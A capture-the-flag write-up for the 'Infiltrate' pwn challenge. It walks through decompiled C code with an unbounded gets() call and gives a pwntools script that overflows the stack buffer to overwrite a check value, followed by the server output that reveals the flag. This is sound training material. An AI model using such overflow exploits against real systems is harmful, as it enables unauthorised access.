# Infiltrate

Category: Pwn

## Description

> We are a security organization and our agents are given unique usernames that are impossible to guess. We have recently built a very secure inventory. If you are one of our agents, we have a package ready for you!

A binary was attached.

## Solution

Let's run the attached binary:

```console
┌──(user@kali3)-[/media/sf_CTFs/google/Infiltrate]
└─$ ./chal
Username please: test
Hello test, welcome to the system!
Unrecognized user! System is shutting down.
```

Let's open the binary in Ghidra to see what this is all about:

```c

undefined8 main(void)
{
  undefined8 uVar1;
  char local_38 [24];
  void *local_20;
  int local_14;
  undefined4 local_10;
  int local_c;
  
  local_c = L'\xbaadc0de';
  printf("Username please: ");
  fflush(stdout);
  gets(local_38);
  printf("Hello %s, welcome to the system!\n",local_38);
  if (local_c == L'\xdefec8ed') {
    puts("We have a package for you! Wait to receive it...");
    local_10 = 2;
    sleep(2);
    local_14 = open("/flag",0);
    if (local_14 < 0) {
      perror("unable to read the flag!\n");
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    local_20 = malloc(100);
    read(local_14,local_20,100);
    printf("The package has arrived: %s\n",local_20);
    close(local_14);
    uVar1 = 0;
  }
  else {
    puts("Unrecognized user! System is shutting down.");
    uVar1 = 1;
  }
  return uVar1;
}
```

This seems pretty simple, we need to exploit the buffer overflow in `gets(local_38)` to override
`local_c` with the value of `0xdefec8ed`. We just need to calculate the right offset to overrun, 
which is somewhere in the area of `sizeof(local_38) + sizeof(local_20) + sizeof(local_14) + sizeof(local_10) + sizeof(local_c)`, i.e. 
`24 + 8 + 4 + 4`, give or take some padding.

We'll use `pwntools` for that:

```python
# First, create a pwntools template using:
#  $ pwn template --host infiltrate.2024-bq.ctfcompetition.com --port 1337 ./chal

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No

io = start()

offset = 24 + 8 + 4 + 4 + 4
payload = fit({
    offset: p32(0xdefec8ed)
})
io.recvuntilS(b"Username please: ")
io.sendline(payload)
print (io.recvallS())
```

Output:

```console
┌──(user@kali3)-[/media/sf_CTFs/google/Infiltrate]
└─$ python3 exploit.py
[*] '/media/sf_CTFs/google/Infiltrate/chal'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
[+] Opening connection to infiltrate.2024-bq.ctfcompetition.com on port 1337: Done
[+] Receiving all data: Done (180B)
[*] Closed connection to infiltrate.2024-bq.ctfcompetition.com port 1337
Hello aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaaíÈþÞ, welcome to the system!
We have a package for you! Wait to receive it...
The package has arrived: CTF{Buff3R0v3rflowIsCool!}
```